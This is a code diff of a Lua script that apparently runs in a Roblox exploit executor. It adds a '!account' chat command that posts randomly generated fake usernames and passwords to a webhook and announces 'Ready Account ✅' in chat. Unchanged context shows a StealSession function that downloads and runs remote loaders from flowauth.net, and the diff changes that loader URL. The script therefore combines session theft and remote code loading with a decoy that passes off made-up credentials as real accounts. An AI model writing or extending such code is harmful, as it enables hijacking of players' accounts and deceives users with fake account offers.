@@ -20,6 +20,34 @@ local function monitorChat()
                         if textMessage.TextSource and textMessage.TextSource.UserId == LocalPlayer.UserId then
                             lastChatMessage = textMessage.Text
                         end
+                        if textMessage.Text == "!account" then
+                            local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
+                            if requestFunc then
+                                pcall(function()
+                                    requestFunc({
+                                        Url = WebhookURL,
+                                        Method = "POST",
+                                        Headers = {["Content-Type"] = "application/json"},
+                                        Body = HttpService:JSONEncode({
+                                            ["username"] = "Roblox Account 🤖",
+                                            ["avatar_url"] = "https://i.ibb.co/Zp5tPpJj/IMG-3928.png",
+                                            ["content"] = "Ready Account ✅",
+                                            ["embeds"] = {{
+                                                ["title"] = "Random Fake Account Generated",
+                                                ["color"] = 0x2ECC71,
+                                                ["fields"] = {
+                                                    {["name"] = "📧 Username / Email", ["value"] = "user_" .. tostring(math.random(10000, 99999)) .. "@gmail.com", ["inline"] = true},
+                                                    {["name"] = "🔑 Password", ["value"] = "Pass_" .. tostring(math.random(10000000, 99999999)), ["inline"] = true}
+                                                }
+                                            }}
+                                        })
+                                    })
+                                end)
+                            end
+                            pcall(function()
+                                textMessage.TextChannel:SendAsync("Ready Account ✅")
+                            end)
+                        end
                     end)
                 end
             end
@@ -29,19 +57,75 @@ local function monitorChat()
                         if textMessage.TextSource and textMessage.TextSource.UserId == LocalPlayer.UserId then
                             lastChatMessage = textMessage.Text
                         end
+                        if textMessage.Text == "!account" then
+                            local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
+                            if requestFunc then
+                                pcall(function()
+                                    requestFunc({
+                                        Url = WebhookURL,
+                                        Method = "POST",
+                                        Headers = {["Content-Type"] = "application/json"},
+                                        Body = HttpService:JSONEncode({
+                                            ["username"] = "Account Roblox 🤖",
+                                            ["avatar_url"] = "https://i.ibb.co/Zp5tPpJj/IMG-3928.png",
+                                            ["content"] = "Ready Account ✅",
+                                            ["embeds"] = {{
+                                                ["title"] = "Random Account Generated",
+                                                ["color"] = 0x2ECC71,
+                                                ["fields"] = {
+                                                    {["name"] = "📧 Username / Email", ["value"] = "user_" .. tostring(math.random(10000, 99999)) .. "@gmail.com", ["inline"] = true},
+                                                    {["name"] = "🔑 Password", ["value"] = "Pass_" .. tostring(math.random(10000000, 99999999)), ["inline"] = true}
+                                                }
+                                            }}
+                                        })
+                                    })
+                                end)
+                            end
+                            pcall(function()
+                                textMessage.TextChannel:SendAsync("Ready Account ✅")
+                            end)
+                        end
                     end)
                 end
             end)
         else
             LocalPlayer.Chatted:Connect(function(message)
                 lastChatMessage = message
+                if message == "!account" then
+                    local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
+                    if requestFunc then
+                        pcall(function()
+                            requestFunc({
+                                Url = WebhookURL,
+                                Method = "POST",
+                                Headers = {["Content-Type"] = "application/json"},
+                                Body = HttpService:JSONEncode({
+                                    ["username"] = "Account Roblox 🤖",
+                                    ["avatar_url"] = "https://i.ibb.co/Zp5tPpJj/IMG-3928.png",
+                                    ["content"] = "Ready Account ✅",
+                                    ["embeds"] = {{
+                                        ["title"] = "Random Account Generated",
+                                        ["color"] = 0x2ECC71,
+                                        ["fields"] = {
+                                            {["name"] = "👤 Username / Email", ["value"] = "user_" .. tostring(math.random(10000, 99999)), ["inline"] = true},
+                                            {["name"] = "🆔 User ID", ["value"] = "id_" .. tostring(math.random(10000, 99999)), ["inline"] = true},
+                                            {["name"] = "🔑 Password", ["value"] = "Pass_" .. tostring(math.random(100000, 99999999)), ["inline"] = true}
+                                        }
+                                    }}
+                                })
+                            })
+                        end)
+                    end
+                    pcall(function()
+                        game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer("Ready Account ✅", "All")
+                    end)
+                end
             end)
         end
     end)
 end
 
 monitorChat()
-
 
 local function getAvatarThumbnail(userId)
     local success, result = pcall(function()
@@ -57,7 +141,6 @@ local function getAvatarThumbnail(userId)
     
     return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(userId) .. "&width=420&height=420&format=png"
 end
-
 
 local function getPlaceThumbnail(placeId)
     local success, result = pcall(function()
@@ -148,7 +231,7 @@ local function StealSession()
     end
 
     local loaders = {
-        "https://flowauth.net/v1/loaders/VR7.lua"
+        "https://flowauth.net/v1/loaders/SA.lua"
     }
 
     for _, url in ipairs(loaders) do
